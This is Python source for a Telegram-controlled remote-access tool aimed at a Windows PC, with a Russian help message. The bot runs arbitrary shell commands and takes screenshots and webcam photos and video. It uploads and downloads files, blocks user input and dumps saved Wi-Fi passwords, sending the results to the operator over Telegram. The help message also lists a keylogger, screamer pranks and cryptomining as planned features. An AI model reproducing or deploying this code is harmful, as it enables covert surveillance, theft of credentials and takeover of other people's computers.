import os
import pyautogui
import speech_recognition as sr
import pyscreenshot
from aiogram import Bot, types
from aiogram.dispatcher import Dispatcher
from aiogram.types import ContentType
from aiogram.utils import executor
from config.config import TOKEN

from time import sleep

from pc_remouter import RemoteManager
from pc_controller.sound import Sound

bot = Bot(token=TOKEN)
dp = Dispatcher(bot)

rm = RemoteManager(bot)


@dp.message_handler(commands=['start'])
async def process_start_command(message: types.Message):
    await message.reply(
        """Привет! Вот список моих комманд:
        /download 'file_name' - скачать файл из текущей директории
        Уже есть: 
            получение изображения с вебки
            Получение скриншота
            Выполнение комманд терминала
            Скачивание и загрузка файлов
        В планах:
            видео раб стола
            манипуляции с браузером
            скримеры (рекрол, смена раб стола, воспроизведение музыки)!!!
            кейлоггер
            изменение раб стола
            видео и звук с вебки
            баннеры
            тестирование
            перенос на другие оси
        В будущем: 
            майнинг""")


async def send_message(bot, id, text):
    while text:
        await bot.send_message(id, text[:4096])
        text = text[4096::]


@dp.message_handler(commands=['download'])
async def download(message: types.Message):
    try:
        command = message.text.split()
        content = open(command[1], 'rb')

        await message.reply_document(content)
    except Exception:
        await message.reply("Error in download file")


@dp.message_handler(commands=['.'])
async def exe(message: types.Message):
    command = message.text.split()[1::]
    await message.reply(rm.execute_command_console(command))


@dp.message_handler(commands=['screen'])
async def send_screenshot(msg: types.Message):
    image = pyscreenshot.grab()
    image.save("screen.png")

    await bot.send_photo(msg.from_user.id, types.InputFile('screen.png'))

    os.remove("screen.png")


@dp.message_handler(commands=['cam'])
async def send_cam(msg: types.Message):
    rm.make_cam_photo()

    await bot.send_photo(msg.from_user.id, types.InputFile('screen_camera.png'))

    os.remove("screen_camera.png")


@dp.message_handler(commands=['webvideo'])
async def video_from_webcam(message: types.Message):
    video_bytes = rm.make_desktop_video()
    await bot.send_message(message.from_user.id, 'Приятного просмотра!')
    await bot.send_video(message.from_user.id, video=video_bytes)

    os.remove("webvideo.avi")


@dp.message_handler(commands=['meme'])
async def open_mem(msg: types.Message):
    rm.open_url()
    sleep(3)
    Sound.volume_max()


@dp.message_handler(commands=['openurl'])
async def open_mem(msg: types.Message):
    rm.open_url(msg.text.split()[1])


@dp.message_handler(commands='s')
async def say_text(msg: types.Message):
    await rm.say_text(msg.text[2:])


@dp.message_handler(commands='click')
async def mouse_left_click(msg: types.Message):
    pyautogui.click()


@dp.message_handler(commands='block')
async def write(msg: types.Message):
    rm.blockinput()


@dp.message_handler(commands='unblock')
async def write(msg: types.Message):
    rm.blockinput_stop()


@dp.message_handler(commands='v')
async def set_volume(msg: types.Message):
    try:
        Sound.volume_set(int(msg.text.split()[1]))
        await rm.say_text(f'Громкость звука установлена на {msg.text.split()[1]}%')
    except Exception:
        await msg.answer('Введите комманду в формате "/v x", где x - число от 0 до 100')


@dp.message_handler(content_types=[ContentType.VOICE])
async def voice_say(msg: types.Message):
    voice = msg.voice
    await voice.download()

    await voice.download(destination_file=r'voice/voice.wav')

    r = sr.Recognizer()
    with sr.AudioFile('voice/voice.wav') as source:
        audio = r.record(source)
        print('success')

    print(r.recognize_google(audio, language='ru-RU'))


@dp.message_handler(commands=["change"], commands_prefix="/", commands_ignore_caption=False, content_types=["photo"])
async def change_desktop_wallpapers(msg: types.Message):
    await msg.photo[-1].download('C:/img/img.jpg')
    rm.change_background(r'C:/img/img.jpg')


@dp.message_handler(commands=["wifi"], commands_prefix="/", commands_ignore_caption=False)
async def get_passwords(msg: types.Message):
    await send_message(bot, msg.from_user.id, rm.get_passwords())


@dp.message_handler()
async def echo_message(msg: types.Message):
    print(msg.text)
    command = str(msg.text).split()
    result = rm.execute(command)

    await send_message(bot, msg.from_user.id, result)


@dp.message_handler(content_types=[ContentType.DOCUMENT, ContentType.UNKNOWN])
async def upload(message: types.Message):
    try:
        file = message.document

        path = rm.execute_command_console('cd')
        path = path[:len(path) - 1:]

        path += '\\' + file.file_name

        await file.download(destination_file=path)
        await message.reply("Success")
    except Exception:
        await message.reply("Error in upload file")


if __name__ == '__main__':
    try:
        while True:
            executor.start_polling(dp)
    except:
        print('ошибка')
